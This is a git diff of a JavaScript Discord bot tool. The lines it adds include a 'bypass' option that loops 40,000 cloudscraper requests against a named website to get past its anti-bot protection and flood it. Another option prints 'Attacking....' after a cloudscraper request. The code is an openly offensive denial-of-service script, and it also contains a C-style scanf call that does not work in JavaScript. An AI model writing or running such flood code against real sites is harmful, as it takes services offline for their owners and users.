@@ -118,21 +118,39 @@ client.on('ready', () => {
 	    client.login(clients[count]);
 	};
 	break;
-    case "bypass":
-        option3 = cloudscraper.get('http://website.com/', function(error, response, body) {
-  if (error) {
+    case "lol":
+        option3 = console.log(`\t Would you like to enable verbose mode?(y/n)\n`);
+	input = scanf('%c');
+            if (input === 'y'){
+		client.on("debug", (m) => console.log(chalk.bold.bgMagenta("[Verbose]", m)));
+		client.on("warn", (m) => console.log(chalk.bgRed("[Warning!]", m)));	
+	}
+     	else if (input === 'n'){
+		console.log(`lol`);
+	}
+            cloudscraper.get('http://website.com/', function(error, response, body) {
+    if (error) {
     console.log('Error occurred');
-  } else {
-    console.log(body, response);
-  }
+         } 
+    else {
+    console.log('Attacking....');
+    }
 });;
         break;
     case "verbose":
         option4 = ""
         break;
-    case "soon":
-        option5 = "";
+    case "bypass":
+        for(i=0; i<40000;i++){
+	       cloudscraper.get('https://jesterscourt.cc/', function(error, response, body) {
+               if (error) {
+                   console.log('Error occurred');
+               } 
+               else {
+                   console.log(body, response);
+	           } 
+            });;;}
         break;
-    default:
+default:
 	option6 = "";
 }
